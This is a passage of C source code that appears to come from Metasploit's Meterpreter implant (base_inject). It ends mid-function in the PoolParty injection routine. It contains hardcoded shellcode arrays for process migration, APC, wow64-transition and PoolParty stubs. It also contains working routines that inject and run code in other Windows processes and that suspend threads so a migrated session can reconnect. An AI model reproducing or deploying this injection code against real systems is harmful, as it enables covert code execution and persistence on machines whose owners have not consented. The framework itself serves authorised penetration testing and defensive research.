#include "metsrv.h"
#include "base_inject.h"
#include "remote_thread.h"
#include "pool_party.h"
#include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
#include <tlhelp32.h>

// see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
// 03.06.2017: fixed an elusive bug on AMD CPUs, http://blog.rewolf.pl/blog/?p=1484
//             found and fixed by ReWolf, incorporated by RaMMicHaeL
BYTE migrate_executex64[] =	{0x55,0x89,0xE5,0x56,0x57,0x8B,0x75,0x08,0x8B,0x4D,0x0C,0xE8,0x00,0x00,0x00,0x00
							,0x58,0x83,0xC0,0x2B,0x83,0xEC,0x08,0x89,0xE2,0xC7,0x42,0x04,0x33,0x00,0x00,0x00
							,0x89,0x02,0xE8,0x0F,0x00,0x00,0x00,0x66,0x8C,0xD8,0x66,0x8E,0xD0,0x83,0xC4,0x14
							,0x5F,0x5E,0x5D,0xC2,0x08,0x00,0x8B,0x3C,0xE4,0xFF,0x2A,0x48,0x31,0xC0,0x57,0xFF
							,0xD6,0x5F,0x50,0xC7,0x44,0x24,0x04,0x23,0x00,0x00,0x00,0x89,0x3C,0x24,0xFF,0x2C
							,0x24};

// see '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'
BYTE migrate_wownativex[] = {0xFC,0x48,0x89,0xCE,0x48,0x89,0xE7,0x48,0x83,0xE4,0xF0,0xE8,0xC8,0x00,0x00,0x00
							,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48
							,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A
							,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9
							,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C
							,0x48,0x01,0xD0,0x66,0x81,0x78,0x18,0x0B,0x02,0x75,0x72,0x8B,0x80,0x88,0x00,0x00
							,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40
							,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6
							,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0
							,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40
							,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0
							,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58
							,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A
							,0x48,0x8B,0x12,0xE9,0x4F,0xFF,0xFF,0xFF,0x5D,0x4D,0x31,0xC9,0x41,0x51,0x48,0x8D
							,0x46,0x18,0x50,0xFF,0x76,0x10,0xFF,0x76,0x08,0x41,0x51,0x41,0x51,0x49,0xB8,0x01
							,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x31,0xD2,0x48,0x8B,0x0E,0x41,0xBA,0xC8
							,0x38,0xA4,0x40,0xFF,0xD5,0x48,0x85,0xC0,0x74,0x0C,0x48,0xB8,0x00,0x00,0x00,0x00
							,0x00,0x00,0x00,0x00,0xEB,0x0A,0x48,0xB8,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00
							,0x48,0x83,0xC4,0x50,0x48,0x89,0xFC,0xC3};

// see '/msf3/external/source/shellcode/x86/migrate/apc.asm'
BYTE apc_stub_x86[] =		{0xFC,0x8B,0x74,0x24,0x04,0x55,0x89,0xE5,0xE8,0x89,0x00,0x00,0x00,0x60,0x89,0xE5
							,0x31,0xD2,0x64,0x8B,0x52,0x30,0x8B,0x52,0x0C,0x8B,0x52,0x14,0x8B,0x72,0x28,0x0F
							,0xB7,0x4A,0x26,0x31,0xFF,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0xC1,0xCF
							,0x0D,0x01,0xC7,0xE2,0xF0,0x52,0x57,0x8B,0x52,0x10,0x8B,0x42,0x3C,0x01,0xD0,0x8B
							,0x40,0x78,0x85,0xC0,0x74,0x4A,0x01,0xD0,0x50,0x8B,0x48,0x18,0x8B,0x58,0x20,0x01
							,0xD3,0xE3,0x3C,0x49,0x8B,0x34,0x8B,0x01,0xD6,0x31,0xFF,0x31,0xC0,0xAC,0xC1,0xCF
							,0x0D,0x01,0xC7,0x38,0xE0,0x75,0xF4,0x03,0x7D,0xF8,0x3B,0x7D,0x24,0x75,0xE2,0x58
							,0x8B,0x58,0x24,0x01,0xD3,0x66,0x8B,0x0C,0x4B,0x8B,0x58,0x1C,0x01,0xD3,0x8B,0x04
							,0x8B,0x01,0xD0,0x89,0x44,0x24,0x24,0x5B,0x5B,0x61,0x59,0x5A,0x51,0xFF,0xE0,0x58
							,0x5F,0x5A,0x8B,0x12,0xEB,0x86,0x5B,0x80,0x7E,0x10,0x00,0x75,0x3B,0xC6,0x46,0x10
							,0x01,0x68,0xA6,0x95,0xBD,0x9D,0xFF,0xD3,0x3C,0x06,0x7C,0x1A,0x31,0xC9,0x64,0x8B
							,0x41,0x18,0x39,0x88,0xA8,0x01,0x00,0x00,0x75,0x0C,0x8D,0x93,0xCF,0x00,0x00,0x00
							,0x89,0x90,0xA8,0x01,0x00,0x00,0x31,0xC9,0x51,0x51,0xFF,0x76,0x08,0xFF,0x36,0x51
							,0x51,0x68,0x38,0x68,0x0D,0x16,0xFF,0xD3,0xC9,0xC2,0x0C,0x00,0x00,0x00,0x00,0x00
							,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
							,0x00,0x00,0x00,0x00};

// see '/msf3/external/source/shellcode/x64/migrate/apc.asm'
BYTE apc_stub_x64[] =		{0xFC,0x80,0x79,0x10,0x00,0x0F,0x85,0x13,0x01,0x00,0x00,0xC6,0x41,0x10,0x01,0x48
							,0x83,0xEC,0x78,0xE8,0xC8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48
							,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48
							,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C
							,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41
							,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x66,0x81,0x78,0x18,0x0B
							,0x02,0x75,0x72,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01
							,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF
							,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41
							,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45
							,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C
							,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41
							,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20
							,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x4F,0xFF,0xFF,0xFF
							,0x5D,0x48,0x31,0xD2,0x65,0x48,0x8B,0x42,0x30,0x48,0x39,0x90,0xC8,0x02,0x00,0x00
							,0x75,0x0E,0x48,0x8D,0x95,0x07,0x01,0x00,0x00,0x48,0x89,0x90,0xC8,0x02,0x00,0x00
							,0x4C,0x8B,0x01,0x4C,0x8B,0x49,0x08,0x48,0x31,0xC9,0x48,0x31,0xD2,0x51,0x51,0x41
							,0xBA,0x38,0x68,0x0D,0x16,0xFF,0xD5,0x48,0x81,0xC4,0xA8,0x00,0x00,0x00,0xC3,0x00
							,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
							,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
							,0x00,0x00,0x00};
							
// see '/msf3/external/source/shellcode/x64/migrate/poolparty.asm'
BYTE poolparty_stub_x64[] = {0xFC,0x55,0x57,0x56,0x48,0x89,0xE7,0xE9,0x01,0x01,0x00,0x00,0x5E,0x48,0x83,0xEC
							,0x78,0xE8,0xC8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2
							,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72
							,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C
							,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48
							,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x66,0x81,0x78,0x18,0x0B,0x02,0x75
							,0x72,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50
							,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41
							,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9
							,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1
							,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44
							,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41
							,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52
							,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x4F,0xFF,0xFF,0xFF,0x5D,0x8B
							,0x4E,0x10,0x48,0x31,0xD2,0xFF,0xCA,0x41,0xBA,0x08,0x87,0x1D,0x60,0xFF,0xD5,0x48
							,0x31,0xD2,0x4C,0x8B,0x06,0x4C,0x8B,0x4E,0x08,0x48,0x31,0xC9,0x51,0x51,0x41,0xBA
							,0x38,0x68,0x0D,0x16,0xFF,0xD5,0x48,0x89,0xFC,0x5E,0x5F,0x5D,0xC3,0xE8,0xFA,0xFE
							,0xFF,0xFF};

/*
 * Attempt to gain code execution in the remote process via a call to ntdll!NtQueueApcThread
 * Note: Windows Server 2008R2 can blue screen if you use APC injection to inject into another sessions csrss.exe
 */
DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter )
{
	DWORD dwResult                     = ERROR_ACCESS_DENIED;
	HMODULE hNtdll                     = NULL;
	NTQUEUEAPCTHREAD pNtQueueApcThread = NULL;
	HANDLE hThreadSnap                 = NULL;
	LPVOID lpApcStub                   = NULL;
	LPVOID lpRemoteApcStub             = NULL;
	LPVOID lpRemoteApcContext          = NULL;
	LIST * thread_list                 = NULL;
	THREADENTRY32 t                    = {0};
	APCCONTEXT ctx                     = {0};
	DWORD dwApcStubLength              = 0;

	do
	{
		thread_list = list_create();
		if( !thread_list )
			break;

		ctx.s.lpStartAddress = lpStartAddress;
		ctx.p.lpParameter    = lpParameter;
		ctx.bExecuted        = FALSE;

		t.dwSize = sizeof( THREADENTRY32 );

		// Get the architecture specific apc migration stub...
		if( dwDestinationArch == PROCESS_ARCH_X86 )
		{
			if( dwMeterpreterArch == PROCESS_ARCH_X64 )
			{
				// injecting x64->x86(wow64)
				
				// Our injected APC ends up running in native x64 mode within the wow64 process and as such 
				// will need a modified stub to transition to wow64 before execuing the apc_stub_x86 stub.

				// This issue does not effect x64->x86 injection using the kernel32!CreateRemoteThread method though.
				
				SetLastError( ERROR_ACCESS_DENIED );
				BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Can't do x64->x86 APC injection yet." )
			}
			else
			{
				// injecting x86->x86
				lpApcStub       = &apc_stub_x86;
				dwApcStubLength = sizeof( apc_stub_x86 );
			}
		}
		else if( dwDestinationArch == PROCESS_ARCH_X64 )
		{
			// injecting x64->x64 (and the same stub for x86(wow64)->x64)
			lpApcStub       = &apc_stub_x64;
			dwApcStubLength = sizeof( apc_stub_x64 );

			if( dwMeterpreterArch == PROCESS_ARCH_X86 )
			{
				// injecting x86(wow64)->x64

				// For now we leverage a bug in wow64 to get x86->x64 injection working, this
				// will simply fail gracefully on systems where the technique does not work.

				MEMORY_BASIC_INFORMATION mbi = {0};
				LPVOID lpRemoteAddress       = NULL;
				BYTE * lpNopSled             = NULL;
				BYTE bStub[]                 = "\x48\x89\xC8\x48\xC1\xE1\x20\x48\xC1\xE9\x20\x48\xC1\xE8\x20\xFF\xE0";
				
				/*
					// On Windows 2003 x64 there is a bug in the implementation of NtQueueApcThread for wow64 processes.
					// The call from a wow64 process to NtQueueApcThread to inject an APC into a native x64 process is sucessful, 
					// however the start address of the new APC in the native x64 process is not what we specify but instead it is
					// the address of the wow64.dll export wow64!Wow64ApcRoutine as found in the wow64 process! We can simple VirtualAlloc
					// this address (No ASLR on Windows 2003) and write a simple NOP sled which will jump to our real APC. From there
					// injection will continue as normal.

					// The registers on the native x64 process after the queued APC is attempted to run:
					rip = 000000006B0095F0                             // address of wow64!Wow64ApcRoutine as found in the wow64 process
					rcx = ( dwApcRoutine << 32 ) | dwApcRoutineContext // (our start address and param)
					rdx = dwApcStatusBlock                             // unused
					r8  = dwApcReserved                                // unused

					// On the WOW64 process side:
					wow64:000000006B0095F0 ; Exported entry   3. Wow64ApcRoutine
					wow64:000000006B0095F0
					wow64:000000006B0095F0	public Wow64ApcRoutine

					// On the native x64 process side:
					ntdll:0000000077EF30A0 public KiUserApcDispatcher
					ntdll:0000000077EF30A0	mov     rcx, [rsp]    // 32bit dwApcRoutine and 32bit dwApcRoutineContext into 64bit value
					ntdll:0000000077EF30A4	mov     rdx, [rsp+8]  // 32bit dwApcStatusBlock
					ntdll:0000000077EF30A9	mov     r8, [rsp+10h] // 32bit dwApcReserved
					ntdll:0000000077EF30AE	mov     r9, rsp
					ntdll:0000000077EF30B1	call    qword ptr [rsp+18h] // <--- we call the other processes wow64 address for wow64!Wow64ApcRoutine!

					// Our bStub:
					00000000  4889C8            mov rax, rcx
					00000003  48C1E120          shl rcx, 32
					00000007  48C1E920          shr rcx, 32
					0000000B  48C1E820          shr rax, 32
					0000000F  FFE0              jmp rax
				*/

				// alloc the address of the wow64!Wow64ApcRoutine export in the remote process...
				// TO-DO: parse the PE64 executable wow64.dll to get this at runtime.
				lpRemoteAddress = VirtualAllocEx( hProcess, (LPVOID)0x6B0095F0, 8192, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
				if( !lpRemoteAddress )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx 0x6B0095F0 failed" );

				if( VirtualQueryEx( hProcess, lpRemoteAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION) ) == 0 )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualQueryEx failed" );

				lpNopSled = (BYTE *)malloc( mbi.RegionSize );
				if( !lpNopSled )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: malloc lpNopSled failed" );
				
				memset( lpNopSled, 0x90, mbi.RegionSize );
				
				if( !WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed" )
				
				if( !WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - sizeof(bStub)), bStub, sizeof(bStub), NULL ) )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed" )

				free( lpNopSled );
			}
		}
		else
		{
			SetLastError( ERROR_BAD_ENVIRONMENT );
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Invalid target architecture" )
		}

		hNtdll = LoadLibraryA( "ntdll" );
		if( !hNtdll )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: LoadLibraryA failed" )

		pNtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddress( hNtdll, "NtQueueApcThread" );
		if( !pNtQueueApcThread )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed" )

		hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
		if( !hThreadSnap )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed" )

		if( !Thread32First( hThreadSnap, &t ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Thread32First failed" )
		
		// Allocate memory for the apc stub and context
		lpRemoteApcStub = VirtualAllocEx( hProcess, NULL, dwApcStubLength + sizeof(APCCONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !lpRemoteApcStub )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx failed" )

		// Simply determine the apc context address
		lpRemoteApcContext = ( (BYTE *)lpRemoteApcStub + dwApcStubLength );

		dprintf( "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwMeterpreterArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );

		// Write the apc stub to memory...
		if( !WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed" )

		// Write the apc context to memory...
		if( !WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed" )

		do
		{
			HANDLE hThread = NULL;

			// Only proceed if we are targeting a thread in the target process
			if( t.th32OwnerProcessID != dwProcessID )
				continue;

			// Open a handle to this thread so we can do the apc injection
			hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, t.th32ThreadID );
			if( !hThread )
				continue;

			dprintf("[INJECT] inject_via_apcthread: Trying to inject into thread %d", t.th32ThreadID );

			// Only inject into threads we can suspend to avoid synchronization issue whereby the new metsrv will attempt 
			// a connection back but the client side will not be ready to accept it and we loose the session.
			if( SuspendThread( hThread ) != (DWORD)-1 )
			{
				list_push( thread_list, hThread );

				// Queue up our apc stub to run in the target thread, when our apc stub is run (when the target 
				// thread is placed in an alertable state) it will spawn a new thread with our actual migration payload.
				// Any successfull call to NtQueueApcThread will make migrate_via_apcthread return ERROR_SUCCESS.
				if( pNtQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
				{
					dprintf("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.", t.th32ThreadID );
					dwResult = ERROR_SUCCESS;
				}
				else
				{
					dprintf("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.", t.th32ThreadID );
				}
			}
			else
			{
				CloseHandle( hThread );
			}
			
			// keep searching for more target threads to inject our apc stub into...

		} while( Thread32Next( hThreadSnap, &t ) );

	} while( 0 );

	if( dwResult == ERROR_SUCCESS && remote && response )
	{
		// We should only run this block if we are being used for migration...

		// Send a successful response to let the ruby side know that we've pretty
		// much successfully migrated and have reached the point of no return
		packet_add_tlv_uint( response, TLV_TYPE_MIGRATE_TECHNIQUE, MIGRATE_TECHNIQUE_APCQUEUE );
		packet_transmit_response( ERROR_SUCCESS, remote, response );

		// Sleep to give the remote side a chance to catch up...
		Sleep( 2000 );
	}

	if( thread_list )
	{
		// Resume all the threads which we queued our apc into as the remote
		// client side will now be ready to handle the new conenction.
		while( TRUE )
		{
			HANDLE t = (HANDLE)list_pop( thread_list );
			if( !t )
				break;
			ResumeThread( t );
			CloseHandle( t );
		}

		list_destroy( thread_list );
	}

	if( hThreadSnap )
		CloseHandle( hThreadSnap );

	if( hNtdll )
		FreeLibrary( hNtdll );

	SetLastError( dwResult );

	return dwResult;
}

/*
 * Attempt to gain code execution in a native x64 process from a wow64 process by transitioning out of the wow64 (x86)
 * enviroment into a native x64 enviroment and accessing the native win64 API's.
 * Note: On Windows 2003 the injection will work but in the target x64 process issues occur with new 
 *       threads (kernel32!CreateThread will return ERROR_NOT_ENOUGH_MEMORY). Because of this we filter out
 *       Windows 2003 from this method of injection, however the APC injection method will work on 2003.
 */
DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE * pThread )
{
	DWORD dwResult           = ERROR_SUCCESS;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;
	OSVERSIONINFO os         = {0};

	do
	{
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: GetVersionEx failed" )

		// filter out Windows 2003
		if ( os.dwMajorVersion == 5 && os.dwMinorVersion == 2 )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: Windows 2003 not supported." )
		}

		// alloc a RWX buffer in this process for the EXECUTEX64 function
		pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(migrate_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !pExecuteX64 )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed" )
	
		// alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
		pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(migrate_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !pX64function )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed" )
		
		// copy over the wow64->x64 stub
		memcpy( pExecuteX64, &migrate_executex64, sizeof(migrate_executex64) );

		// copy over the native x64 function
		memcpy( pX64function, &migrate_wownativex, sizeof(migrate_wownativex) );

		// set the context
		ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + sizeof(migrate_wownativex) );

		ctx->h.hProcess       = hProcess;
		ctx->s.lpStartAddress = lpStartAddress;
		ctx->p.lpParameter    = lpParameter;
		ctx->t.hThread        = NULL;

		dprintf( "[INJECT] inject_via_remotethread_wow64: pExecuteX64=0x%08X, pX64function=0x%08X, ctx=0x%08X", pExecuteX64, pX64function, ctx );

		// Transition this wow64 process into native x64 and call pX64function( ctx )
		// The native function will use the native Win64 API's to create a remote thread in the target process.
		if( !pExecuteX64( pX64function, (DWORD)(DWORD_PTR)ctx ) )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed" )
		}

		if( !ctx->t.hThread )
		{
			SetLastError( ERROR_INVALID_HANDLE );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: ctx->t.hThread is NULL" )
		}

		// Success! grab the new thread handle from of the context
		*pThread = ctx->t.hThread;

		dprintf( "[INJECT] inject_via_remotethread_wow64: Success, hThread=0x%08X", ctx->t.hThread );

	} while( 0 );

	if( pExecuteX64 )
		VirtualFree( pExecuteX64, 0, MEM_DECOMMIT );

	if( pX64function )
		VirtualFree( pX64function, 0, MEM_DECOMMIT );

	return dwResult;
}

/*
 * Attempte to gain code execution in the remote process by creating a remote thread in the target process.
 */
DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
{
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREAD;
	HANDLE hThread = NULL;

	do
	{
		// Create the thread in the remote process. Create suspended in case the call to CreateRemoteThread
		// fails, giving us a chance to try an alternative method or fail migration gracefully.
		hThread = create_remote_thread(hProcess, 1024 * 1024, lpStartAddress, lpParameter, CREATE_SUSPENDED, NULL);
		if (!hThread)
		{
			if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
			{
				dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;

				if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
				{
					BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
				}
			}
			else
			{
				BREAK_ON_ERROR("[INJECT] inject_via_remotethread: CreateRemoteThread failed")
			}
		}
		else
		{
			dprintf("[INJECT] inject_via_remotethread: succeeded");
		}

		if (remote && response)
		{
			dprintf("[INJECT] inject_via_remotethread: Sending a migrate response...");
			// Send a successful response to let the ruby side know that we've pretty
			// much successfully migrated and have reached the point of no return
			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
			packet_transmit_response(ERROR_SUCCESS, remote, response);

			dprintf("[INJECT] inject_via_remotethread: Sleeping for two seconds...");
			// Sleep to give the remote side a chance to catch up...
			Sleep(2000);
		}

		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
		// Resume the injected thread...
		if (ResumeThread(hThread) == (DWORD)-1)
		{
			BREAK_ON_ERROR("[INJECT] inject_via_remotethread: ResumeThread failed")
		}

	} while (0);

	if (hThread)
	{
		CloseHandle(hThread);
	}

	SetLastError(dwResult);

	return dwResult;
}

DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter) {
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTechnique = MIGRATE_TECHNIQUE_POOLPARTY;
	HANDLE hThread = NULL;
	LPVOID lpPoolPartyStub;
	POOLPARTYCONTEXT ctx = { 0 };
	ctx.s.lpStartAddress = lpStartAddress;
	ctx.p.lpParameter = lpParameter;
	HANDLE hTriggerEvent = INVALID_HANDLE_VALUE;
	HANDLE hRemoteTriggerEvent = INVALID_HANDLE_VALUE;

	LPVOID lpStub = NULL;
	DWORD dwStubSize = 0;
	HANDLE hHeap = GetProcessHeap();
	

	if (!supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch)) {
		return ERROR_INVALID_FUNCTION;
	}

	POOLPARTY_INJECTOR *poolparty = GetOrInitPoolParty(dwMeterpreterArch, dwDestinationArch);

	do
	{
	
		if (dwDestinationArch == PROCESS_ARCH_X64 && (dwMeterpreterArch == PROCESS_ARCH_X64 || dwMeterpreterArch == PROCESS_ARCH_X86)) {
			dprintf("[INJECT][inject_via_poolparty] using: poolparty_stub_x64");
			lpStub = &poolparty_stub_x64;
			dwStubSize = sizeof(poolparty_stub_x64);
		}
		else {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_INVALID_FUNCTION);
		}

		hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!hTriggerEvent)
		{
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
		}

		// Duplicate the event handle for the target process
		if (!DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
		}

		lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
		if (!lpPoolPartyStub) {
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!");
		}
		
		if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
